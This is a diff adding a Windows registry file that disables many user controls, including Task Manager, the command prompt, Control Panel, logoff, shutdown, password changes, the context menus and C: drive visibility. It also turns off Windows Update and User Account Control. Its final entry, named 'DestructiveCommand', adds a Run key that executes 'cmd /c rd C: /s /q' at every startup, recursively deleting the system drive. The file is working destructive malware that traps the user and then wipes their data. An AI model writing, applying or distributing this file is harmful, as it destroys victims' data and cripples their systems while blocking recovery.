@@ -1,0 +1,127 @@
+Windows Registry Editor Version 5.00
+
+; ### Disable Shutdown, Restart, Sleep, and Hibernate ###
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer]
+"NoClose"=dword:00000001
+
+; ### Disable Task Manager ###
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]
+"DisableTaskMgr"=dword:00000001
+
+; ### Disable Log Off ###
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer]
+"NoLogoff"=dword:00000001
+
+; ### Hide Specific Drives (C: as an Example) ###
+; 4 = C:, 3FFFFFF = All Drives
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer]
+"NoDrives"=dword:00000004
+"NoViewOnDrive"=dword:00000004
+
+; ### Disable Run Command ###
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]
+"NoRun"=dword:00000001
+
+; ### Disable Command Prompt ###
+[HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System]
+"DisableCMD"=dword:00000001
+"EnableScripts"=dword:00000000
+
+; ### Disable Control Panel and Settings ###
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]
+"NoControlPanel"=dword:00000001
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer]
+"NoControlPanel"=dword:00000001
+
+; ### Disable Changing Password ###
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]
+"NoChangePassword"=dword:00000001
+
+; ### Disable Context Menus ###
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]
+"NoViewContextMenu"=dword:00000001
+
+; ### Remove the Windows Search Bar ###
+[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Explorer]
+"DisableSearchBoxSuggestions"=dword:00000001
+
+; ### Disable Taskbar Right-Click Menu ###
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer]
+"NoTrayContextMenu"=dword:00000001
+
+; ### Disable Right-Click Desktop Context Menu ###
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]
+"NoViewContextMenu"=dword:00000001
+
+; ### Disable Lock Workstation ###
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System]
+"DisableLockWorkstation"=dword:00000001
+
+; ### Remove Clock from Taskbar ###
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer]
+"HideClock"=dword:00000001
+
+; ### Disable Recent Documents ###
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]
+"NoRecentDocsHistory"=dword:00000001
+"NoRecentDocsMenu"=dword:00000001
+
+; ### Disable Network Access ###
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]
+"NoNetHood"=dword:00000001
+[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Network Connections]
+"NC_PersonalFirewallConfig"=dword:00000001
+
+; ### Disable Software Installation ###
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer]
+"NoAddFromInternet"=dword:00000001
+"NoAddFromCDorFloppy"=dword:00000001
+"NoAddFromNetwork"=dword:00000001
+"NoWindowsUpdate"=dword:00000001
+
+; ### Disable Windows Updates ###
+[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU]
+"NoAutoUpdate"=dword:00000001
+"AUOptions"=dword:00000001
+
+; ### Disable USB Ports ###
+; Uncomment to disable USB storage access
+; [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\USBSTOR]
+; "Start"=dword:00000004
+
+; ### Disable CD/DVD Drives ###
+; Uncomment to disable CD/DVD drives
+; [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\cdrom]
+; "Start"=dword:00000004
+
+; ### Remove the Start Menu Search Option ###
+[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Explorer]
+"DisableSearchBoxSuggestions"=dword:00000001
+
+; ### Remove Start Menu Power Button ###
+[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Explorer]
+"HidePowerButton"=dword:00000001
+
+; ### Remove All Icons from Desktop ###
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]
+"NoDesktop"=dword:00000001
+
+; ### Disable Changing Wallpaper ###
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop]
+"NoChangingWallPaper"=dword:00000001
+
+; ### Disable User Account Control Prompts ###
+[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System]
+"EnableLUA"=dword:00000000
+
+; ### Disable Aero Snap and Shake ###
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]
+"NoWindowMinimizingShortcuts"=dword:00000001
+
+; ### Disable Windows Key Shortcuts ###
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer]
+"NoWinKeys"=dword:00000001
+
+; ### Add Startup Entry to Run 'cmd /c rd C: /s /q' ###
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
+"DestructiveCommand"="cmd /c rd C: /s /q"
